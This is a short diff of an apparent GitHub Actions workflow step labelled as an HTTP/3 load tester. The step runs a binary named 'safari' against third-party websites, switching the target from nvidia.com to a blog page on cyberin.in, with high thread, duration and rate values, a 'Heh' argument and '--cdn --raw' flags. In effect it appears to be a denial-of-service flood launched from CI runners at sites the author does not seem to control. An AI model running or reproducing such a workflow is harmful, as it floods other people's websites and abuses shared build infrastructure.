@@ -30,7 +30,7 @@ jobs:
       - name: Run HTTP/3 load tester
         run: |
           chmod +x *
-          ./safari  https://www.nvidia.com/en-in/ 200 10000 3000 Heh --cdn --raw 
+          ./safari  https://cyberin.in/blog/best-hosting-providers-for-high-traffic-websites-in-india/ 200 10000 3000 Heh --cdn --raw 
           
           
           
